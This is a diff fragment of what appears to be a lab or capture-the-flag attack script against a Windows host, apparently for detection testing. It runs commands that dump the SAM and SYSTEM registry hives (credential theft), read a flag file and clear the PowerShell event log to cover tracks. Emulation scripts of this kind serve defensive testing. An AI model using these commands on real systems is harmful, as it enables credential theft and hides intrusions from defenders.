@@ -14,10 +14,10 @@ root 'reg save HKLM\SAM C:\Windows\Temp\sam.save /y'
 root 'reg save HKLM\SYSTEM C:\Windows\Temp\system.save /y'
 
 say "reading the SYSTEM flag"
-root 'type C:\Windows\flag.txt' | strip
+root 'more.com C:\Windows\flag.txt' | strip
 
 say "covering tracks (PowerShell log, not Security — leave 4688 intact)"
-rce 'wevtutil cl "Windows PowerShell"' | strip
+root 'wevtutil cl "Windows PowerShell"' | strip
 
 note "expected on the target:"
 note "  process INFO     schtasks /run BackupSvc / cmd.exe running backup.bat as SYSTEM"
